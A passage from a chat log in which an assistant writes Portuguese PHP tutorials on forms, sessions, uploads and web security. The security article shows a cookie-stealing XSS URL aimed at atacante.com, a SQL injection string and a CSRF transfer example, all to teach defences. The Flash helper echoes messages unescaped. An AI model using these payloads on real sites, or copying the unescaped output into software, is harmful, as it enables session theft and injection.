        $erros['mensagem'] = 'A mensagem é obrigatória.';
    } elseif (strlen($dados['mensagem']) < 10) {
        $erros['mensagem'] = 'A mensagem deve ter pelo menos 10 caracteres.';
    }

    // Se não houver erros, processa
    if (empty($erros)) {
        // Aqui: salvar no banco, enviar email, etc.
        $sucesso = true;

        // Boa prática: redirecionar após sucesso (Post/Redirect/Get)
        // Evita reenvio do formulário ao pressionar F5
        header('Location: contato.php?enviado=1');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Formulário de Contato</title>
</head>
<body>

<?php if (isset($_GET['enviado'])): ?>
    <p style="color: green">Mensagem enviada com sucesso!</p>
<?php endif; ?>

<form method="POST" action="contato.php" novalidate>

    <div>
        <label for="nome">Nome:</label>
        <!-- htmlspecialchars evita XSS ao repopular o campo -->
        <input type="text" id="nome" name="nome"
               value="<?= htmlspecialchars($dados['nome']) ?>"
               maxlength="100">
        <?php if (isset($erros['nome'])): ?>
            <span class="erro"><?= htmlspecialchars($erros['nome']) ?></span>
        <?php endif; ?>
    </div>

    <div>
        <label for="email">Email:</label>
        <input type="email" id="email" name="email"
               value="<?= htmlspecialchars($dados['email']) ?>">
        <?php if (isset($erros['email'])): ?>
            <span class="erro"><?= htmlspecialchars($erros['email']) ?></span>
        <?php endif; ?>
    </div>

    <div>
        <label for="mensagem">Mensagem:</label>
        <textarea id="mensagem" name="mensagem" rows="5"><?=
            htmlspecialchars($dados['mensagem'])
        ?></textarea>
        <?php if (isset($erros['mensagem'])): ?>
            <span class="erro"><?= htmlspecialchars($erros['mensagem']) ?></span>
        <?php endif; ?>
    </div>

    <button type="submit">Enviar</button>
</form>

</body>
</html>
```

---

## Validação robusta com filter_var e filter_input

O PHP oferece funções nativas para validação e sanitização de entrada:

```php
<?php

// filter_var — valida ou sanitiza um valor
$email = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
if ($email === false) {
    // Email inválido
}

// FILTER_VALIDATE_INT — valida inteiro com faixa opcional
$idade = filter_var($_POST['idade'] ?? '', FILTER_VALIDATE_INT, [
    'options' => ['min_range' => 1, 'max_range' => 150]
]);

// FILTER_VALIDATE_FLOAT
$preco = filter_var($_POST['preco'] ?? '', FILTER_VALIDATE_FLOAT, [
    'flags' => FILTER_FLAG_ALLOW_FRACTION
]);

// FILTER_VALIDATE_URL
$site = filter_var($_POST['site'] ?? '', FILTER_VALIDATE_URL);

// FILTER_SANITIZE_NUMBER_INT — remove tudo que não é dígito ou sinal
$telefone = filter_var($_POST['telefone'] ?? '', FILTER_SANITIZE_NUMBER_INT);

// filter_input — lê e filtra diretamente de $_POST, $_GET etc.
$nome = filter_input(INPUT_POST, 'nome', FILTER_SANITIZE_SPECIAL_CHARS);
$id   = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
```

---

## Classe de validação reutilizável

Em vez de repetir validações espalhadas, crie uma classe:

```php
<?php
declare(strict_types=1);

class Validador
{
    private array $erros = [];

    public function obrigatorio(string $campo, string $valor, string $rotulo): static
    {
        if (trim($valor) === '') {
            $this->erros[$campo] = "{$rotulo} é obrigatório.";
        }
        return $this;
    }

    public function tamanho(string $campo, string $valor, int $min, int $max, string $rotulo): static
    {
        $len = mb_strlen(trim($valor));
        if ($len < $min) {
            $this->erros[$campo] = "{$rotulo} deve ter pelo menos {$min} caracteres.";
        } elseif ($len > $max) {
            $this->erros[$campo] = "{$rotulo} deve ter no máximo {$max} caracteres.";
        }
        return $this;
    }

    public function email(string $campo, string $valor): static
    {
        if (!filter_var(trim($valor), FILTER_VALIDATE_EMAIL)) {
            $this->erros[$campo] = 'Informe um email válido.';
        }
        return $this;
    }

    public function inteiro(string $campo, mixed $valor, string $rotulo, int $min = PHP_INT_MIN, int $max = PHP_INT_MAX): static
    {
        $v = filter_var($valor, FILTER_VALIDATE_INT, ['options' => ['min_range' => $min, 'max_range' => $max]]);
        if ($v === false) {
            $this->erros[$campo] = "{$rotulo} deve ser um número inteiro entre {$min} e {$max}.";
        }
        return $this;
    }

    public function regex(string $campo, string $valor, string $padrao, string $mensagem): static
    {
        if (!preg_match($padrao, $valor)) {
            $this->erros[$campo] = $mensagem;
        }
        return $this;
    }

    public function valido(): bool  { return empty($this->erros); }
    public function erros(): array  { return $this->erros; }
    public function erro(string $campo): ?string { return $this->erros[$campo] ?? null; }
}

// Uso:
$v = new Validador();
$v->obrigatorio('nome', $_POST['nome'] ?? '', 'Nome')
  ->tamanho('nome', $_POST['nome'] ?? '', 2, 100, 'Nome')
  ->obrigatorio('email', $_POST['email'] ?? '', 'Email')
  ->email('email', $_POST['email'] ?? '')
  ->inteiro('idade', $_POST['idade'] ?? '', 'Idade', 1, 150);

if ($v->valido()) {
    // processa
} else {
    $erros = $v->erros();
}
```

---

## Checkboxes, radios e selects

```php
<?php
// Checkbox: presente no POST se marcado, ausente se desmarcado
$aceita_termos = isset($_POST['termos']) && $_POST['termos'] === '1';

// Radio: só um valor possível
$plano = $_POST['plano'] ?? '';
$planosValidos = ['basico', 'pro', 'enterprise'];
if (!in_array($plano, $planosValidos, strict: true)) {
    $erros['plano'] = 'Selecione um plano válido.';
}

// Select múltiplo: array de valores
$interesses = $_POST['interesses'] ?? [];
if (!is_array($interesses)) {
    $interesses = [];
}
// Sanitiza cada valor do array
$interesses = array_filter($interesses, fn($i) => in_array($i, ['php', 'js', 'python'], true));

// No HTML: name="interesses[]" para enviar como array
```

```html
<input type="checkbox" name="termos" value="1"> Li e aceito os termos

<input type="radio" name="plano" value="basico"> Básico
<input type="radio" name="plano" value="pro"> Pro

<select name="interesses[]" multiple>
    <option value="php">PHP</option>
    <option value="js">JavaScript</option>
    <option value="python">Python</option>
</select>
```

---

## Padrão Post/Redirect/Get

O maior erro de iniciantes em formulários PHP é não usar o padrão PRG. Sem ele, ao pressionar F5 após enviar um formulário, o navegador pergunta "reenviar dados?" — e se o usuário confirmar, o formulário é enviado novamente, criando duplicatas.

A solução é simples: após processar com sucesso, redirecione. Nunca retorne uma resposta HTML diretamente de um POST:

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // valida e processa...

    if ($sucesso) {
        // Redireciona — o próximo acesso será GET
        // Pode passar mensagem via session ou query string
        $_SESSION['flash'] = 'Cadastro realizado com sucesso!';
        header('Location: /usuarios/lista');
        exit; // SEMPRE após header Location
    }
}
```

---

## Resumo

| Conceito | Ponto principal |
|---|---|
| $_POST / $_GET | Superglobais que recebem os dados do formulário |
| htmlspecialchars() | Obrigatório ao exibir dados do usuário no HTML |
| filter_var() | Validação e sanitização nativa do PHP |
| Post/Redirect/Get | Evita reenvio acidental do formulário |
| Validador | Classe reutilizável que centraliza regras de negócio |

---

## Exercício da semana

1. Crie um formulário de cadastro com: nome (2–100 chars), email (válido, único no banco), senha (mínimo 8 chars, pelo menos uma letra maiúscula e um número), data de nascimento (deve ser maior de 18 anos), plano (radio: básico, pro), interesses (checkbox múltiplo).

2. Implemente o padrão PRG: após cadastro com sucesso, redirecione para uma página de confirmação com mensagem flash via `$_SESSION`.

3. Adicione validação do lado do cliente (HTML5 `required`, `pattern`, `min`/`max`) e garanta que o servidor revalide tudo independentemente — nunca confie apenas na validação do cliente.

4. **Desafio:** implemente rate limiting simples: armazene no banco (ou em arquivo) o IP e timestamp dos últimos envios. Se o mesmo IP enviar mais de 3 formulários em 5 minutos, retorne erro 429.

---

## Referências

- PHP Manual — Variáveis de formulários: https://www.php.net/manual/pt_BR/tutorial.forms.php
- PHP Manual — filter_var: https://www.php.net/manual/pt_BR/function.filter-var.php
- OWASP — Input Validation Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html

---

# Artigo 35 — Sessions e Cookies

**Módulo 5 · Semana 35 · Nível: Intermediário**

---

## Introdução

HTTP é um protocolo sem estado (*stateless*). Cada requisição é independente — o servidor não sabe, por padrão, que a requisição do usuário A às 14h05 foi feita pela mesma pessoa que fez a requisição às 14h03. Isso é ótimo para escalabilidade, mas péssimo para qualquer aplicação que precise de contexto: login, carrinho de compras, preferências de idioma.

Sessions e cookies são os mecanismos que adicionam estado ao HTTP. Sessions guardam dados no servidor; cookies guardam dados no navegador. Entender a diferença, os casos de uso de cada um, e como usá-los com segurança é fundamental.

---

## Cookies — dados no navegador

Um cookie é um par chave-valor que o servidor envia ao navegador, e o navegador devolve automaticamente em todas as requisições seguintes para o mesmo domínio:

```php
<?php

// Criar um cookie
// setcookie() deve ser chamado ANTES de qualquer saída HTML
setcookie(
    name:     'idioma',
    value:    'pt-BR',
    expires_or_options: time() + (86400 * 30), // 30 dias
    path:     '/',
    domain:   '',
    secure:   true,   // Apenas HTTPS
    httponly: true,   // JavaScript não pode acessar
);

// Ler um cookie
$idioma = $_COOKIE['idioma'] ?? 'pt-BR';

// Deletar um cookie: defina expires no passado
setcookie('idioma', '', time() - 3600, '/');
```

Os parâmetros `secure: true` e `httponly: true` são fundamentais para segurança. `httponly` impede que JavaScript leia o cookie — crucial para cookies de sessão, pois bloqueia ataques XSS que tentam roubar cookies.

---

## Sessions — dados no servidor

Sessions funcionam assim: o servidor cria um identificador único (session ID), armazena dados no servidor associados a esse ID, e envia o ID ao navegador como cookie. Em cada requisição, o navegador devolve o cookie com o ID, e o servidor recupera os dados:

```php
<?php

// Configurações de segurança ANTES de session_start()
ini_set('session.cookie_httponly', '1');
ini_set('session.cookie_secure', '1');   // Apenas HTTPS
ini_set('session.cookie_samesite', 'Lax');
ini_set('session.use_strict_mode', '1'); // Rejeita session IDs não iniciados pelo servidor

session_start();

// Armazenar dados na sessão
$_SESSION['usuario_id']   = 42;
$_SESSION['usuario_nome'] = 'Alice';
$_SESSION['logado_em']    = time();

// Ler dados da sessão
if (isset($_SESSION['usuario_id'])) {
    echo "Bem-vindo, " . htmlspecialchars($_SESSION['usuario_nome']) . "!";
}

// Remover um dado específico
unset($_SESSION['carrinho_temporario']);

// Destruir a sessão completamente (logout)
session_unset();
session_destroy();

// Também limpe o cookie
setcookie(session_name(), '', time() - 3600, '/');
```

---

## Regeneração de session ID — prevenindo session fixation

Um ataque de *session fixation* acontece quando um atacante força a vítima a usar um session ID conhecido. Ao fazer login, sempre regenere o ID:

```php
<?php
session_start();

function fazerLogin(string $email, string $senha, PDO $pdo): bool
{
    $stmt = $pdo->prepare('SELECT id, nome, senha_hash FROM usuarios WHERE email = ?');
    $stmt->execute([$email]);
    $usuario = $stmt->fetch();

    if (!$usuario || !password_verify($senha, $usuario['senha_hash'])) {
        return false;
    }

    // CRÍTICO: regenerar o ID antes de armazenar dados de autenticação
    // Invalida o session ID antigo, cria um novo
    session_regenerate_id(delete_old_session: true);

    $_SESSION['usuario_id']   = $usuario['id'];
    $_SESSION['usuario_nome'] = $usuario['nome'];
    $_SESSION['logado_em']    = time();

    return true;
}
```

---

## Sistema de autenticação completo

```php
<?php
declare(strict_types=1);

class Auth
{
    private const SESSION_LIFETIME = 7200; // 2 horas
    private const MAX_TENTATIVAS   = 5;

    public function __construct(private readonly PDO $pdo) {}

    public function login(string $email, string $senha): bool
    {
        // Proteção contra brute-force
        if ($this->excedeuentativas($email)) {
            throw new RuntimeException('Muitas tentativas. Tente novamente em 15 minutos.');
        }

        $stmt = $this->pdo->prepare(
            'SELECT id, nome, senha_hash FROM usuarios WHERE email = ? AND ativo = 1'
        );
        $stmt->execute([$email]);
        $usuario = $stmt->fetch();

        if (!$usuario || !password_verify($senha, $usuario['senha_hash'])) {
            $this->registrarTentativa($email);
            return false;
        }

        $this->limparTentativas($email);
        session_regenerate_id(delete_old_session: true);

        $_SESSION['uid']       = $usuario['id'];
        $_SESSION['nome']      = $usuario['nome'];
        $_SESSION['inicio']    = time();
        $_SESSION['ip']        = $_SERVER['REMOTE_ADDR'];
        $_SESSION['ua']        = $_SERVER['HTTP_USER_AGENT'] ?? '';

        return true;
    }

    public function verificar(): bool
    {
        if (!isset($_SESSION['uid'])) return false;

        // Timeout por inatividade
        if (time() - $_SESSION['inicio'] > self::SESSION_LIFETIME) {
            $this->logout();
            return false;
        }

        // Validação básica de IP e user agent (proteção contra roubo de sessão)
        if ($_SESSION['ip'] !== ($_SERVER['REMOTE_ADDR'] ?? '')) {
            $this->logout();
            return false;
        }

        // Atualiza o timestamp de última atividade
        $_SESSION['inicio'] = time();
        return true;
    }

    public function logout(): void
    {
        session_unset();
        session_destroy();
        setcookie(session_name(), '', time() - 3600, '/', secure: true, httponly: true);
    }

    public function usuarioId(): ?int
    {
        return $_SESSION['uid'] ?? null;
    }

    private function excedeuentativas(string $email): bool
    {
        $stmt = $this->pdo->prepare(
            "SELECT COUNT(*) FROM tentativas_login
             WHERE email = ? AND criado_em > datetime('now', '-15 minutes')"
        );
        $stmt->execute([$email]);
        return (int) $stmt->fetchColumn() >= self::MAX_TENTATIVAS;
    }

    private function registrarTentativa(string $email): void
    {
        $this->pdo->prepare('INSERT INTO tentativas_login (email, ip) VALUES (?, ?)')
            ->execute([$email, $_SERVER['REMOTE_ADDR'] ?? '']);
    }

    private function limparTentativas(string $email): void
    {
        $this->pdo->prepare('DELETE FROM tentativas_login WHERE email = ?')
            ->execute([$email]);
    }
}
```

---

## Flash messages

Flash messages são mensagens de sessão que existem apenas até a próxima requisição — exibem feedback de operações após um redirect:

```php
<?php
class Flash
{
    public static function adicionar(string $tipo, string $mensagem): void
    {
        $_SESSION['flash'][] = ['tipo' => $tipo, 'mensagem' => $mensagem];
    }

    public static function obterETodos(): array
    {
        $mensagens = $_SESSION['flash'] ?? [];
        unset($_SESSION['flash']);
        return $mensagens;
    }
}

// Uso: após salvar com sucesso
Flash::adicionar('sucesso', 'Produto cadastrado com sucesso!');
header('Location: /produtos');
exit;

// Na página de destino (produtos.php):
foreach (Flash::obterETodos() as $flash) {
    echo "<div class='alerta {$flash['tipo']}'>{$flash['mensagem']}</div>";
}
```

---

## Cookies de longo prazo — "Lembrar de mim"

O "Lembrar de mim" não deve estender a sessão PHP (que fica na memória do servidor). Deve usar um cookie separado com um token seguro persistido no banco:

```php
<?php

function criarTokenLembrarMe(int $usuarioId, PDO $pdo): void
{
    $token = bin2hex(random_bytes(32)); // 64 chars hex, criptograficamente seguro
    $hash  = hash('sha256', $token);   // Armazena o hash, não o token

    $pdo->prepare(
        'INSERT INTO tokens_lembrar_me (usuario_id, token_hash, expira_em)
         VALUES (?, ?, datetime("now", "+30 days"))'
    )->execute([$usuarioId, $hash]);

    setcookie('lembrar_me', $token, [
        'expires'  => time() + 86400 * 30,
        'path'     => '/',
        'secure'   => true,
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
}

function verificarTokenLembrarMe(PDO $pdo): ?int
{
    $token = $_COOKIE['lembrar_me'] ?? null;
    if (!$token) return null;

    $hash = hash('sha256', $token);

    $stmt = $pdo->prepare(
        "SELECT usuario_id FROM tokens_lembrar_me
         WHERE token_hash = ? AND expira_em > datetime('now')"
    );
    $stmt->execute([$hash]);
    $row = $stmt->fetch();

    if (!$row) return null;

    // Rotação de token: invalida o usado e cria um novo
    $pdo->prepare('DELETE FROM tokens_lembrar_me WHERE token_hash = ?')->execute([$hash]);
    criarTokenLembrarMe($row['usuario_id'], $pdo);

    return (int) $row['usuario_id'];
}
```

---

## Resumo

| Mecanismo | Dados ficam onde | Validade | Caso de uso |
|---|---|---|---|
| Cookie | Navegador | Configurável | Preferências, lembrar-me |
| Session PHP | Servidor | Até fechar o browser ou timeout | Autenticação, carrinho |
| Token lembrar-me | Banco + cookie | Longa (30 dias) | Login persistente seguro |

---

## Exercício da semana

1. Implemente um sistema de login completo: formulário, verificação de senha com `password_hash`/`password_verify`, regeneração de session ID, middleware de proteção para páginas autenticadas.

2. Adicione flash messages ao sistema: após login com sucesso, redirecione com mensagem "Bem-vindo, {nome}!". Após logout, redirecione com "Você saiu com sucesso."

3. Implemente "Lembrar de mim" com rotação de token. Teste que o token antigo é invalidado após cada uso.

4. Crie um painel `/admin/sessoes` que liste as sessões ativas do banco (requer salvar metadados de sessão em tabela própria). Implemente um botão "Encerrar esta sessão" que invalida o token.

5. **Desafio:** implemente um handler de sessão customizado (`SessionHandlerInterface`) que armazena sessões no banco de dados em vez de arquivos — necessário para aplicações rodando em múltiplos servidores.

---

## Referências

- PHP Manual — Sessions: https://www.php.net/manual/pt_BR/book.session.php
- PHP Manual — setcookie: https://www.php.net/manual/pt_BR/function.setcookie.php
- OWASP — Session Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- Artigo sobre tokens "Lembrar de mim" seguro: https://paragonie.com/blog/2015/04/secure-authentication-php-with-long-term-persistence

---

# Artigo 36 — Upload de Arquivos

**Módulo 5 · Semana 36 · Nível: Intermediário**

---

## Introdução

Upload de arquivos parece simples — e na superfície é. Mas quando você considera segurança, validação real do tipo do arquivo, limites de tamanho, nomes de arquivo maliciosos, armazenamento organizado e suporte a múltiplos arquivos, o assunto revela profundidade considerável. Neste artigo construímos um sistema de upload robusto do zero.

---

## Como o upload funciona

Quando um formulário com `enctype="multipart/form-data"` é submetido com arquivos, o PHP recebe os dados na superglobal `$_FILES`. Cada arquivo chega como um array com cinco campos:

```php
<?php
// $_FILES['arquivo'] contém:
[
    'name'     => 'foto.jpg',           // Nome original no computador do usuário
    'type'     => 'image/jpeg',         // MIME type declarado pelo navegador (NÃO confie nisso)
    'tmp_name' => '/tmp/php8HgZ3x',     // Caminho temporário onde o PHP salvou
    'error'    => UPLOAD_ERR_OK,        // Código de erro (0 = sem erro)
    'size'     => 245678,               // Tamanho em bytes
]
```

---

## Validação completa

```php
<?php
declare(strict_types=1);

class ValidadorDeUpload
{
    private array $erros = [];

    private const TIPOS_PERMITIDOS = [
        'image/jpeg' => ['jpg', 'jpeg'],
        'image/png'  => ['png'],
        'image/webp' => ['webp'],
        'image/gif'  => ['gif'],
    ];

    private const TAMANHO_MAXIMO = 5 * 1024 * 1024; // 5MB

    public function validar(array $arquivo): bool
    {
        $this->erros = [];

        // 1. Verificar código de erro do PHP
        if ($arquivo['error'] !== UPLOAD_ERR_OK) {
            $this->erros[] = match ($arquivo['error']) {
                UPLOAD_ERR_INI_SIZE, UPLOAD_ERR_FORM_SIZE => 'Arquivo excede o tamanho máximo permitido.',
                UPLOAD_ERR_PARTIAL   => 'O arquivo foi enviado parcialmente.',
                UPLOAD_ERR_NO_FILE   => 'Nenhum arquivo foi selecionado.',
                default              => 'Erro desconhecido no upload.',
            };
            return false;
        }

        // 2. Verificar se é um upload legítimo (não um arquivo local do servidor)
        if (!is_uploaded_file($arquivo['tmp_name'])) {
            $this->erros[] = 'Arquivo inválido.';
            return false;
        }

        // 3. Verificar tamanho
        if ($arquivo['size'] > self::TAMANHO_MAXIMO) {
            $this->erros[] = 'Arquivo excede 5MB.';
            return false;
        }

        // 4. Verificar MIME type REAL com finfo (não confiar no $_FILES['type'])
        $finfo    = new finfo(FILEINFO_MIME_TYPE);
        $mimeReal = $finfo->file($arquivo['tmp_name']);

        if (!array_key_exists($mimeReal, self::TIPOS_PERMITIDOS)) {
            $this->erros[] = "Tipo de arquivo não permitido: {$mimeReal}";
            return false;
        }

        // 5. Verificar extensão contra o MIME real (dupla verificação)
        $extensao = strtolower(pathinfo($arquivo['name'], PATHINFO_EXTENSION));
        if (!in_array($extensao, self::TIPOS_PERMITIDOS[$mimeReal], strict: true)) {
            $this->erros[] = 'Extensão não corresponde ao tipo do arquivo.';
            return false;
        }

        return true;
    }

    public function erros(): array { return $this->erros; }
}
```

---

## Armazenamento seguro

```php
<?php
declare(strict_types=1);

class ServicoDeUpload
{
    public function __construct(
        private readonly string $diretorioBase,
        private readonly ValidadorDeUpload $validador,
    ) {
        if (!is_dir($this->diretorioBase)) {
            mkdir($this->diretorioBase, 0755, recursive: true);
        }
    }

    public function salvar(array $arquivo, string $subdiretorio = ''): string
    {
        if (!$this->validador->validar($arquivo)) {
            throw new InvalidArgumentException(
                implode(', ', $this->validador->erros())
            );
        }

        // NUNCA use o nome original do usuário — pode conter ../../../etc/passwd
        $extensao    = strtolower(pathinfo($arquivo['name'], PATHINFO_EXTENSION));
        $nomeSeguro  = bin2hex(random_bytes(16)) . '.' . $extensao; // Nome aleatório

        $diretorio = rtrim($this->diretorioBase . '/' . ltrim($subdiretorio, '/'), '/');
        if (!is_dir($diretorio)) {
            mkdir($diretorio, 0755, recursive: true);
        }

        $destino = $diretorio . '/' . $nomeSeguro;

        // move_uploaded_file: move o arquivo temporário para o destino final
        // Mais seguro que rename() pois verifica se é um upload legítimo
        if (!move_uploaded_file($arquivo['tmp_name'], $destino)) {
            throw new RuntimeException('Falha ao salvar o arquivo.');
        }

        // Retorna o caminho relativo ao diretorioBase
        return ltrim($subdiretorio . '/' . $nomeSeguro, '/');
    }
}

// Uso:
$servico = new ServicoDeUpload(
    diretorioBase: __DIR__ . '/storage/uploads',
    validador:     new ValidadorDeUpload(),
);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['foto'])) {
    try {
        $caminho = $servico->salvar($_FILES['foto'], 'fotos/perfil');
        echo "Arquivo salvo em: {$caminho}";
    } catch (InvalidArgumentException $e) {
        echo "Erro de validação: " . $e->getMessage();
    }
}
```

---

## Upload múltiplo

```html
<!-- name="fotos[]" permite enviar múltiplos arquivos -->
<input type="file" name="fotos[]" multiple accept="image/*">
```

```php
<?php

// $_FILES['fotos'] com múltiplos arquivos chega num formato diferente
// Precisamos reorganizar para iterar normalmente

function reorganizarArquivos(array $arquivos): array
{
    $resultado = [];
    foreach ($arquivos['name'] as $i => $nome) {
        $resultado[] = [
            'name'     => $nome,
            'type'     => $arquivos['type'][$i],
            'tmp_name' => $arquivos['tmp_name'][$i],
            'error'    => $arquivos['error'][$i],
            'size'     => $arquivos['size'][$i],
        ];
    }
    return $resultado;
}

if (isset($_FILES['fotos'])) {
    $arquivos = reorganizarArquivos($_FILES['fotos']);
    $salvos   = [];
    $erros    = [];

    foreach ($arquivos as $i => $arquivo) {
        try {
            $salvos[] = $servico->salvar($arquivo, 'galeria');
        } catch (InvalidArgumentException $e) {
            $erros[] = "Arquivo " . ($i + 1) . ": " . $e->getMessage();
        }
    }
}
```

---

## Resumo

| Ponto | Detalhe |
|---|---|
| `$_FILES['type']` | Não confie — use `finfo` para o MIME real |
| `is_uploaded_file()` | Sempre verifique antes de mover |
| Nome do arquivo | Nunca use o nome original — gere um aleatório |
| Diretório de upload | Fora do document root ou com `.htaccess` bloqueando execução |
| `move_uploaded_file()` | Prefira a `rename()` para uploads |

---

## Exercício da semana

1. Implemente upload de avatar de usuário: salve o caminho no banco, exiba no perfil, limite a 2MB e aceite apenas JPEG, PNG e WebP.

2. Adicione redimensionamento de imagem usando a extensão GD: após o upload, crie uma versão thumbnail (150x150) e uma versão média (800x600) mantendo proporção.

3. Implemente upload múltiplo de documentos PDF (máx. 10MB cada, máx. 5 arquivos por vez). Armazene os metadados (nome original, tamanho, data) no banco.

4. **Desafio:** implemente armazenamento em dois backends intercambiáveis via interface `StorageInterface`: `LocalStorage` (disco) e `S3Storage` (simulado com arquivo de log). O `ServicoDeUpload` deve receber o backend por injeção de dependência.

---

## Referências

- PHP Manual — Upload de arquivos: https://www.php.net/manual/pt_BR/features.file-upload.php
- PHP Manual — finfo: https://www.php.net/manual/pt_BR/class.finfo.php
- OWASP — File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

---

Artigos 34, 35 e 36 completos — só texto, conforme combinado. **Módulo 5 em andamento** (3 de 4 artigos feitos).

Falta o **Artigo 37 — Segurança em Formulários (XSS, CSRF, SQL Injection)** para fechar o Módulo 5, depois entramos no **Módulo 6 — PHP Moderno (Composer, PSR, boas práticas)**. Continuo?

---

# you asked

message time: 2026-03-10 08:27:58

Sim

---

# claude response

# Artigo 37 — Segurança em Formulários: XSS, CSRF e SQL Injection

**Módulo 5 · Semana 37 · Nível: Intermediário–Avançado**

---

## Introdução

Segurança não é um módulo separado que você adiciona ao projeto no final. É uma camada que permeia cada linha de código que recebe, processa ou exibe dados externos. Os três vetores de ataque mais comuns em aplicações PHP — SQL Injection, XSS e CSRF — respondem por uma parcela enorme das vulnerabilidades exploradas na web. Todos são preveníveis com técnicas simples, mas exigem disciplina consistente.

Neste artigo entendemos como cada ataque funciona, por que as defesas funcionam, e como implementá-las de forma que se torne hábito natural no seu código.

---

## SQL Injection

SQL Injection acontece quando dados do usuário são concatenados diretamente em uma query SQL, permitindo que o atacante modifique a estrutura da query.

**O código vulnerável:**

```php
<?php
// NUNCA faça isso
$email = $_POST['email'];
$query = "SELECT * FROM usuarios WHERE email = '$email'";
$resultado = $pdo->query($query);
```

Se o usuário enviar `' OR '1'='1`, a query vira:

```sql
SELECT * FROM usuarios WHERE email = '' OR '1'='1'
```

Isso retorna todos os usuários. Com variações mais agressivas, o atacante pode deletar tabelas, extrair senhas, ou executar comandos no sistema operacional.

**A defesa: prepared statements com parâmetros:**

```php
<?php
declare(strict_types=1);

// Correto — o valor do usuário nunca toca na estrutura da query
$stmt = $pdo->prepare('SELECT * FROM usuarios WHERE email = ?');
$stmt->execute([$email]);
$usuario = $stmt->fetch();

// Com named parameters — mais legível em queries longas
$stmt = $pdo->prepare(
    'SELECT id, nome, email FROM usuarios
     WHERE email = :email AND ativo = :ativo'
);
$stmt->execute([
    ':email' => $email,
    ':ativo' => 1,
]);

// INSERT também — nunca concatene valores em DML
$stmt = $pdo->prepare(
    'INSERT INTO usuarios (nome, email, senha_hash) VALUES (?, ?, ?)'
);
$stmt->execute([$nome, $email, password_hash($senha, PASSWORD_ARGON2ID)]);
```

O mecanismo de proteção é a separação entre código e dados. O banco de dados recebe a estrutura da query e os valores separadamente — o driver de banco nunca interpreta os valores como SQL.

**Identificadores dinâmicos — o caso especial:**

Prepared statements protegem valores, mas não nomes de colunas ou tabelas. Se você precisar de um identificador dinâmico, use whitelist:

```php
<?php
// Ordenação por coluna dinâmica — vulnerável se não validado
$coluna    = $_GET['ordenar'] ?? 'nome';
$direcao   = $_GET['direcao'] ?? 'ASC';

// Whitelist: só permite valores conhecidos
$colunaPermitida   = in_array($coluna, ['nome', 'email', 'criado_em'], strict: true)
    ? $coluna : 'nome';
$direcaoPermitida = in_array(strtoupper($direcao), ['ASC', 'DESC'], strict: true)
    ? strtoupper($direcao) : 'ASC';

// Agora é seguro interpolar — são valores que você controla
$stmt = $pdo->query(
    "SELECT * FROM usuarios ORDER BY {$colunaPermitida} {$direcaoPermitida} LIMIT 50"
);
```

---

## XSS — Cross-Site Scripting

XSS acontece quando dados do usuário são exibidos no HTML sem escape, permitindo que o atacante injete scripts que rodam no navegador de outras pessoas.

**O código vulnerável:**

```php
<?php
// NUNCA faça isso
echo "Bem-vindo, " . $_GET['nome'] . "!";
```

Se o usuário acessar `?nome=<script>document.location='https://atacante.com/roubo?c='+document.cookie</script>`, o script roda no navegador de qualquer pessoa que acesse essa URL — roubando cookies de sessão.

**A defesa: htmlspecialchars() em toda saída:**

```php
<?php
// SEMPRE escape antes de exibir no HTML
function h(string $texto): string
{
    return htmlspecialchars($texto, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

echo "Bem-vindo, " . h($_GET['nome']) . "!";

// Em atributos HTML — também precisa de escape
echo '<input value="' . h($valor) . '">';

// Em atributos de evento — escape NÃO é suficiente, evite dados dinâmicos
// <button onclick="ação('<?= h($valor) ?>')"> — ainda arriscado
```

**Content Security Policy — defesa em profundidade:**

Mesmo que um XSS escorregue pelo seu código, o CSP instrui o navegador a não executar scripts não autorizados:

```php
<?php
// Envie o header CSP em todas as páginas
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;");
```

**Armazenando e exibindo HTML do usuário:**

Às vezes você precisa exibir HTML enviado pelo usuário (editores rich text). Nunca exiba HTML bruto — use uma biblioteca de sanitização:

```php
<?php
// Instale via composer: composer require ezyang/htmlpurifier
require 'vendor/autoload.php';

$config    = HTMLPurifier_Config::createDefault();
$purificador = new HTMLPurifier($config);

$htmlLimpo = $purificador->purify($_POST['conteudo']);
// Agora é seguro salvar no banco e exibir
```

---

## CSRF — Cross-Site Request Forgery

CSRF é um ataque onde um site malicioso faz o navegador da vítima enviar uma requisição autenticada para outro site — sem que a vítima saiba. Se você está logado em `banco.com` e visita `malicioso.com`, uma imagem invisível com `src="https://banco.com/transferir?valor=5000&destino=hacker"` pode acionar uma transferência usando sua sessão ativa.

**A defesa: token CSRF sincronizado:**

```php
<?php
declare(strict_types=1);

class TokenCSRF
{
    private const CHAVE_SESSION = 'csrf_token';
    private const TTL           = 3600; // 1 hora

    public static function gerar(): string
    {
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_start();
        }

        // Regenera se não existir ou estiver expirado
        if (!isset($_SESSION[self::CHAVE_SESSION]) ||
            time() > ($_SESSION['csrf_expira'] ?? 0)) {

            $_SESSION[self::CHAVE_SESSION] = bin2hex(random_bytes(32));
            $_SESSION['csrf_expira']       = time() + self::TTL;
        }

        return $_SESSION[self::CHAVE_SESSION];
    }

    public static function validar(string $tokenEnviado): bool
    {
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_start();
        }

        $tokenSessao = $_SESSION[self::CHAVE_SESSION] ?? '';

        // hash_equals: comparação em tempo constante — previne timing attacks
        return hash_equals($tokenSessao, $tokenEnviado)
            && time() <= ($_SESSION['csrf_expira'] ?? 0);
    }

    public static function campoHidden(): string
    {
        return '<input type="hidden" name="csrf_token" value="' . self::gerar() . '">';
    }
}
```

**Usando o token nos formulários:**

```php
<!-- Todo formulário POST deve incluir o token -->
<form method="POST" action="/transferir">
    <?= TokenCSRF::campoHidden() ?>
